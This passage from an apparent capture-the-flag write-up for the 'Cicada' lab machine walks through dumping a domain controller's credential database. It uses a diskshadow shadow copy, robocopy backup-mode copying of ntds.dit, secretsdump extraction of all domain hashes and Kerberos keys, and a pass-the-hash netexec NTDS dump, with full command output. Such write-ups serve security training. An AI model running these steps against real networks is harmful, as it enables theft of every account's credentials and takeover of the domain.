set metadata C:\Windows\Temp\0xdf.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% E:
end backup

```

The script will set the `metadata` location (not important, but it needs to exist). It’ll set the backup to be “client accessible” so that they are accessible by me. Then it starts the backup, backing up the `C:\` drive into a volume named `cdrive`, and then exposing that drive as `E:`.

I’ll create this script on my computer and then use `unix2dos` to format it for Windows:

```

oxdf@hacky$ vim backup
oxdf@hacky$ unix2dos backup 
unix2dos: converting file backup to DOS format... 

```

From my shell, I’ll upload the script to where I’m working, `C:\ProgramData`, as `backup`. I’ll run `diskshadow` passing it the script:

```
*Evil-WinRM* PS C:\programdata> diskshadow /s backup
Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  CICADA-DC,  9/27/2024 1:07:11 AM
-> set verbose on
-> set metadata C:\Windows\Temp\0xdf.cab
-> set context clientaccessible
-> begin backup
-> add volume C: alias cdrive
-> create
Component "\BCD\BCD" from writer "ASR Writer" is excluded from backup,
because it requires volume  which is not in the shadow copy set.
The writer "ASR Writer" is now entirely excluded from the backup because the top-level
non selectable component "\BCD\BCD" is excluded.
* Including writer "Task Scheduler Writer":
        + Adding component: \TasksStore
* Including writer "VSS Metadata Store Writer":
        + Adding component: \WriterMetadataStore
* Including writer "Performance Counters Writer":
        + Adding component: \PerformanceCounters
* Including writer "System Writer":
        + Adding component: \System Files
        + Adding component: \Win32 Services Files
* Including writer "WMI Writer":
        + Adding component: \WMI
* Including writer "DFS Replication service writer":
        + Adding component: \SYSVOL\760C4715-6766-4D86-B0E5-4668258AC503-E68080D4-A0B8-4ED9-AB8A-A7FFD4F0BA03
* Including writer "NTDS":
        + Adding component: \C:_Windows_NTDS\ntds
* Including writer "COM+ REGDB Writer":
        + Adding component: \COM+ REGDB
* Including writer "Registry Writer":
        + Adding component: \Registry

Alias cdrive for shadow ID {10b9bb82-275d-4a14-b0fe-727209b03567} set as environment variable.
Alias VSS_SHADOW_SET for shadow set ID {6747b0e5-a9d3-4b68-96e5-28574708abad} set as environment variable.
Inserted file Manifest.xml into .cab file 0xdf.cab
Inserted file BCDocument.xml into .cab file 0xdf.cab
Inserted file WM0.xml into .cab file 0xdf.cab
Inserted file WM1.xml into .cab file 0xdf.cab
Inserted file WM2.xml into .cab file 0xdf.cab
Inserted file WM3.xml into .cab file 0xdf.cab
Inserted file WM4.xml into .cab file 0xdf.cab
Inserted file WM5.xml into .cab file 0xdf.cab
Inserted file WM6.xml into .cab file 0xdf.cab
Inserted file WM7.xml into .cab file 0xdf.cab
Inserted file WM8.xml into .cab file 0xdf.cab
Inserted file WM9.xml into .cab file 0xdf.cab
Inserted file Dis4854.tmp into .cab file 0xdf.cab

Querying all shadow copies with the shadow copy set ID {6747b0e5-a9d3-4b68-96e5-28574708abad}
        * Shadow copy ID = {10b9bb82-275d-4a14-b0fe-727209b03567}               %cdrive%
                - Shadow copy set: {6747b0e5-a9d3-4b68-96e5-28574708abad}       %VSS_SHADOW_SET%
                - Original count of shadow copies = 1
                - Original volume name: \\?\Volume{fcebaf9b-0000-0000-0000-500600000000}\ [C:\]
                - Creation time: 9/27/2024 1:07:28 AM
                - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
                - Originating machine: CICADA-DC.cicada.htb
                - Service machine: CICADA-DC.cicada.htb
                - Not exposed
                - Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
                - Attributes:  No_Auto_Release Persistent Differential

Number of shadow copies listed: 1
-> expose %cdrive% E:
-> %cdrive% = {10b9bb82-275d-4a14-b0fe-727209b03567}
The shadow copy was successfully exposed as E:\.
-> end backup
->

```

It seems to work. `E:\` looks like a backup of `C:\`:

```
*Evil-WinRM* PS C:\> ls E:

    Directory: E:\

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         8/22/2024  11:45 AM                PerfLogs
d-r---         8/29/2024  12:32 PM                Program Files
d-----          5/8/2021   2:40 AM                Program Files (x86)
d-----         3/14/2024   5:21 AM                Shares
d-r---         8/26/2024   1:11 PM                Users
d-----         8/29/2024   3:54 PM                Windows

```

I still don’t have access to copy files from this drive through. I’ll have to use `robocopy` to do it:

```
*Evil-WinRM* PS C:\programdata> robocopy /b E:\Windows\ntds . ntds.dit
-------------------------------------------------------------------------------
   ROBOCOPY     ::     Robust File Copy for Windows
-------------------------------------------------------------------------------

  Started : Friday, September 27, 2024 1:07:57 AM
   Source : E:\Windows\ntds\
     Dest : C:\programdata\

    Files : ntds.dit

  Options : /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30
------------------------------------------------------------------------------

                           1    E:\Windows\ntds\
            New File              16.0 m        ntds.dit
  0.0%
  0.3%
  0.7%
  1.1%
...[snip]...
 99.6%
100%
100%
------------------------------------------------------------------------------

               Total    Copied   Skipped  Mismatch    FAILED    Extras
    Dirs :         1         0         1         0         0         0
   Files :         1         1         0         0         0         0
   Bytes :   16.00 m   16.00 m         0         0         0         0
   Times :   0:00:00   0:00:00                       0:00:00   0:00:00

   Speed :           155,344,592 Bytes/sec.
   Speed :             8,888.889 MegaBytes/min.
   Ended : Friday, September 27, 2024 1:07:57 AM

```

I’ll download this file over WinRM.

### Extract Hashes

`secretsdump.py` can extract these hashes as well:

```

oxdf@hacky$ secretsdump.py -ntds ntds.dit -system system LOCAL
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x3c2b033757a49110a9ee680b46e8d620
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: f954f575c626d6afe06c2b80cc2185e6
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
CICADA-DC$:1000:aad3b435b51404eeaad3b435b51404ee:188c2f3cb7592e18d1eae37991dee696:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:3779000802a4bb402736bee52963f8ef:::
cicada.htb\john.smoulder:1104:aad3b435b51404eeaad3b435b51404ee:0d33a055d07e231ce088a91975f28dc4:::
cicada.htb\sarah.dantelia:1105:aad3b435b51404eeaad3b435b51404ee:d1c88b5c2ecc0e2679000c5c73baea20:::
cicada.htb\michael.wrightson:1106:aad3b435b51404eeaad3b435b51404ee:b222964c9f247e6b225ce9e7c4276776:::
cicada.htb\david.orelious:1108:aad3b435b51404eeaad3b435b51404ee:ef0bcbf3577b729dcfa6fbe1731d5a43:::
cicada.htb\emily.oscars:1601:aad3b435b51404eeaad3b435b51404ee:559048ab2d168a4edf8e033d43165ee5:::
[*] Kerberos keys from ntds.dit 
Administrator:aes256-cts-hmac-sha1-96:e47fd7646fa8cf1836a79166f5775405834e2c060322d229bc93f26fb67d2be5
Administrator:aes128-cts-hmac-sha1-96:f51b243b116894bea389709127df1652
Administrator:des-cbc-md5:c8838c9b10c43b23
CICADA-DC$:aes256-cts-hmac-sha1-96:e9752f2c7752bd92142588e63dc0383499f49b04a46de37845e33d40de1db7ed
CICADA-DC$:aes128-cts-hmac-sha1-96:7fc8e7f2daa14d0ccdf070de9cfc49c5
CICADA-DC$:des-cbc-md5:b0f7cdec040d5b6d
krbtgt:aes256-cts-hmac-sha1-96:357f15dd4d315af47ac63658c444526ec0186f066ad9efb46906a7308b7c60c8
krbtgt:aes128-cts-hmac-sha1-96:39cbc0f220550c51fb89046ac652849e
krbtgt:des-cbc-md5:73b6c419b3b9bf7c
cicada.htb\john.smoulder:aes256-cts-hmac-sha1-96:57ae6faf294b7e6fbd0ce5121ac413d529ae5355535e20739a19b6fd2a204128
cicada.htb\john.smoulder:aes128-cts-hmac-sha1-96:8c0add65bd3c9ad2d1f458a719cfda81
cicada.htb\john.smoulder:des-cbc-md5:f1feaeb594b08575
cicada.htb\sarah.dantelia:aes256-cts-hmac-sha1-96:e25f0b9181f532a85310ba6093f24c1f2f10ee857a97fe18d716ec713fc47060
cicada.htb\sarah.dantelia:aes128-cts-hmac-sha1-96:2ac9a92bca49147a0530e5ce84ceee7d
cicada.htb\sarah.dantelia:des-cbc-md5:0b5b014370fdab67
cicada.htb\michael.wrightson:aes256-cts-hmac-sha1-96:d89ff79cc85032f27499425d47d3421df678eace01ce589eb128a6ffa0216f46
cicada.htb\michael.wrightson:aes128-cts-hmac-sha1-96:f1290a5c4e9d4ef2cd7ad470600124a9
cicada.htb\michael.wrightson:des-cbc-md5:eca8d532fd8f26bc
cicada.htb\david.orelious:aes256-cts-hmac-sha1-96:125726466d0431ed1441caafe8c0ed9ec0d10b0dbaf4fec7a184b764d8a36323
cicada.htb\david.orelious:aes128-cts-hmac-sha1-96:ce66c04e5fd902b15f5d4c611927c9c2
cicada.htb\david.orelious:des-cbc-md5:83585bc41573897f
cicada.htb\emily.oscars:aes256-cts-hmac-sha1-96:4abe28adc1d16373f4c8db4d9bfd34ea1928aca72cb69362d3d90f69d80c000f
cicada.htb\emily.oscars:aes128-cts-hmac-sha1-96:f98d74d70dfb68b70ddd821edcd6a023
cicada.htb\emily.oscars:des-cbc-md5:fd4a5497d38067cd
[*] Cleaning up...

```

Not only do I get the administrator, but also all the users of the domain.

### NetExec

This can also be done with `netexec` using the `ntdsutil` module:

```

oxdf@hacky$ netexec smb 10.10.11.35 -u administrator -H 2b87e7c93a3e8a0ea4a581937016f341 -M ntdsutil
SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\administrator:2b87e7c93a3e8a0ea4a581937016f341 (Pwn3d!)
NTDSUTIL    10.10.11.35     445    CICADA-DC        [*] Dumping ntds with ntdsutil.exe to C:\Windows\Temp\173901502
NTDSUTIL    10.10.11.35     445    CICADA-DC        Dumping the NTDS, this could take a while so go grab a redbull...
NTDSUTIL    10.10.11.35     445    CICADA-DC        [+] NTDS.dit dumped to C:\Windows\Temp\173901502
NTDSUTIL    10.10.11.35     445    CICADA-DC        [*] Copying NTDS dump to /tmp/tmpv0ix0245
NTDSUTIL    10.10.11.35     445    CICADA-DC        [*] NTDS dump copied to /tmp/tmpv0ix0245
NTDSUTIL    10.10.11.35     445    CICADA-DC        [+] Deleted C:\Windows\Temp\173901502 remote dump directory
NTDSUTIL    10.10.11.35     445    CICADA-DC        [+] Dumping the NTDS, this could take a while so go grab a redbull...
NTDSUTIL    10.10.11.35     445    CICADA-DC        Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::
NTDSUTIL    10.10.11.35     445    CICADA-DC        Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
NTDSUTIL    10.10.11.35     445    CICADA-DC        CICADA-DC$:1000:aad3b435b51404eeaad3b435b51404ee:188c2f3cb7592e18d1eae37991dee696:::
NTDSUTIL    10.10.11.35     445    CICADA-DC        krbtgt:502:aad3b435b51404eeaad3b435b51404ee:3779000802a4bb402736bee52963f8ef:::
NTDSUTIL    10.10.11.35     445    CICADA-DC        cicada.htb\john.smoulder:1104:aad3b435b51404eeaad3b435b51404ee:0d33a055d07e231ce088a91975f28dc4:::
NTDSUTIL    10.10.11.35     445    CICADA-DC        cicada.htb\sarah.dantelia:1105:aad3b435b51404eeaad3b435b51404ee:d1c88b5c2ecc0e2679000c5c73baea20:::
NTDSUTIL    10.10.11.35     445    CICADA-DC        cicada.htb\michael.wrightson:1106:aad3b435b51404eeaad3b435b51404ee:b222964c9f247e6b225ce9e7c4276776:::
NTDSUTIL    10.10.11.35     445    CICADA-DC        cicada.htb\david.orelious:1108:aad3b435b51404eeaad3b435b51404ee:ef0bcbf3577b729dcfa6fbe1731d5a43:::
NTDSUTIL    10.10.11.35     445    CICADA-DC        cicada.htb\emily.oscars:1601:aad3b435b51404eeaad3b435b51404ee:559048ab2d168a4edf8e033d43165ee5:::
NTDSUTIL    10.10.11.35     445    CICADA-DC        [+] Dumped 9 NTDS hashes to /home/oxdf/.nxc/logs/CICADA-DC_10.10.11.35_2025-02-08_064346.ntds of which 8 were added to the database
NTDSUTIL    10.10.11.35     445    CICADA-DC        [*] To extract only enabled accounts from the output file, run the following command: 
NTDSUTIL    10.10.11.35     445    CICADA-DC        [*] grep -iv disabled /home/oxdf/.nxc/logs/CICADA-DC_10.10.11.35_2025-02-08_064346.ntds | cut -d ':' -f1

```